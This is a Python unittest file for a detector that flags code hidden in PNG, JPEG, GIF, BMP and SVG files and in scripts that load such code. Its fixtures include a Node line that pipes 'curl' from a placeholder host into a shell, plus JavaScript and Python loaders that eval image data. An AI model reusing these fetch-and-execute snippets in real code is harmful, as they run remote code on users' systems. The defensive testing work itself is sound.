import base64
import gzip
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from app.detection import stego  # noqa: E402
from tests.detection_samples import png  # noqa: E402

CODE = b'require("child_process").exec("curl https://x.invalid | sh");\n'

# minimal JPEG container: SOI, APP0, a comment, SOS + entropy data (with stuffed FF00), EOI
JPEG = (b"\xff\xd8" + b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        + b"\xff\xfe\x00\x0ehello there!"
        + b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00" + b"\x12\x34\xff\x00\x56\xff\xd0\x78" + b"\xff\xd9")
GIF = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00" + b"\x00\x00\x00\xff\xff\xff"   # header + 2-colour table
       + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00" + b"\x02\x02\x44\x01\x00" + b"\x3b")


def scan(files: dict[str, bytes]):
    with tempfile.TemporaryDirectory() as d:
        for name, content in files.items():
            p = Path(d, name)
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(content)
        return stego.check(Path(d), {})


def sev(findings):
    return [(f.check, f.severity) for f in findings]


class Parsers(unittest.TestCase):
    def test_png_end_and_text_chunks(self):
        data = png(extra_chunks=[(b"tEXt", b"Comment\0hi")])
        end, texts = stego.parse_png(data)
        self.assertEqual(end, len(data))
        self.assertEqual(texts, [("Comment", "hi")])

    def test_jpeg_end_skips_stuffed_bytes_and_restart_markers(self):
        end, texts = stego.parse_jpeg(JPEG)
        self.assertEqual(end, len(JPEG))
        self.assertEqual(texts, [("COM", "hello there!")])

    def test_gif_end(self):
        self.assertEqual(stego.parse_gif(GIF)[0], len(GIF))


class Images(unittest.TestCase):
    def test_clean_images_are_silent(self):
        xmp = b"XML:com.adobe.xmp\0\0\0\0\0<x:xmpmeta>http://ns.adobe.com/xap/1.0/ eval(</x:xmpmeta>"
        self.assertEqual(scan({"a.png": png(extra_chunks=[(b"iTXt", xmp)]), "b.jpg": JPEG, "c.gif": GIF}), [])

    def test_code_after_image_end(self):
        for name, img in (("a.png", png()), ("b.jpg", JPEG), ("c.gif", GIF)):
            with self.subTest(name=name):
                fs = scan({name: img + CODE})
                self.assertEqual(fs[0].severity, "malicious")
                # the hidden code is rescanned by code_scan
                self.assertTrue(any(f.message.startswith("[inside image]") for f in fs[1:]))

    def test_base64_and_gzip_wrapped_code(self):
        for wrapped in (base64.b64encode(CODE), gzip.compress(CODE)):
            self.assertEqual(scan({"a.png": png() + wrapped})[0].severity, "malicious")

    def test_executable_and_archive_trailers(self):
        self.assertEqual(sev(scan({"a.png": png() + b"\x7fELF" + bytes(64)}))[0], ("stego", "malicious"))
        self.assertEqual(sev(scan({"a.png": png() + b"PK\x03\x04" + bytes(64)}))[0], ("stego", "suspicious"))

    def test_motion_photo_trailer_is_info(self):
        [f] = scan({"a.jpg": JPEG + b"\x00\x00\x00\x18ftypmp42" + bytes(64)})
        self.assertEqual(f.severity, "info")

    def test_tiny_padding_is_ignored(self):
        self.assertEqual(scan({"a.png": png() + b"\n\n\x00\x00"}), [])

    def test_high_entropy_trailer(self):
        import os
        [f] = scan({"a.png": png() + os.urandom(4096)})
        self.assertEqual((f.severity, f.weight), ("suspicious", 25))

    def test_code_in_metadata(self):
        fs = scan({"a.png": png(extra_chunks=[(b"tEXt", b"Comment\0" + CODE)])})
        self.assertEqual(fs[0].severity, "suspicious")

    def test_file_pretending_to_be_an_image(self):
        self.assertEqual(scan({"logo.png": CODE})[0].severity, "malicious")
        self.assertEqual(scan({"logo.png": b"\x7fELF" + bytes(64)})[0].severity, "malicious")
        self.assertEqual(scan({"logo.png": bytes(range(64))})[0].severity, "suspicious")

    def test_real_image_under_another_name_is_still_checked(self):
        self.assertEqual(scan({"data.bin": png() + CODE})[0].severity, "malicious")

    def test_svg_with_script(self):
        self.assertEqual(sev(scan({"i.svg": b"<svg><script>alert(1)</script></svg>"})), [("stego", "suspicious")])
        self.assertEqual(scan({"i.svg": b"<svg><path d='M0 0'/></svg>"}), [])

    def test_noisy_bmp(self):
        import os
        header = b"BM" + bytes(8) + (54).to_bytes(4, "little") + bytes(40)
        self.assertEqual(sev(scan({"a.bmp": header + os.urandom(8192)})), [("stego", "suspicious")])
        self.assertEqual(scan({"b.bmp": header + bytes(8192)}), [])


class Loaders(unittest.TestCase):
    def test_js_loader(self):
        src = b'const i = require("fs").readFileSync("x.png"); eval(i.subarray(i.indexOf("IEND") + 8).toString())'
        [f] = scan({"l.js": src})
        self.assertEqual(f.severity, "malicious")

    def test_js_loader_with_download_and_pixels(self):
        src = b'const Jimp = require("jimp"); fetch(u).then(async r => { const im = await Jimp.read(r); new Function(im.bitmap.data.toString())(); })'
        [f] = scan({"l.js": src})
        self.assertEqual((f.severity, f.weight), ("malicious", 55))

    def test_python_loader(self):
        src = b"from PIL import Image\nimport requests\nim = Image.open('cat.png')\nexec(bytes(im.getdata()))\n"
        [f] = scan({"l.py": src})
        self.assertEqual(f.severity, "malicious")

    def test_image_use_without_exec_is_fine(self):
        self.assertEqual(scan({"a.js": b'const sharp = require("sharp"); sharp("in.png").resize(10).toFile("o.png")',
                               "b.py": b"from PIL import Image\nImage.open('a.png').getdata()\n"}), [])

    def test_weak_evidence_alone_is_not_a_loader(self):
        self.assertEqual(scan({
            "page.js": b'img.src = "images/logo.png"; eval(cfg)',              # image path + eval
            "t.py": b"import json\nd = json.load(f)\nexec(code)\n",             # .load is not pixels
            "m.js": b"const v = x.data[0]; new Function(src)()",                # .data[ is not pixels
        }), [])

    def test_globalthis_polyfill_is_not_a_sink(self):
        self.assertEqual(scan({"a.js": b'const s = require("sharp"); const g = Function("return this")();'}), [])


class Samples(unittest.TestCase):
    ROOT = Path(__file__).resolve().parent / "fixtures" / "detection-samples"

    def test_stego_demo(self):
        fs = stego.check(self.ROOT / "malicious" / "stego-demo", {})
        self.assertEqual(sum(f.severity == "malicious" for f in fs), 2)

    def test_clean_math_logo(self):
        self.assertEqual(stego.check(self.ROOT / "benign" / "clean-math", {}), [])


if __name__ == "__main__":
    unittest.main()
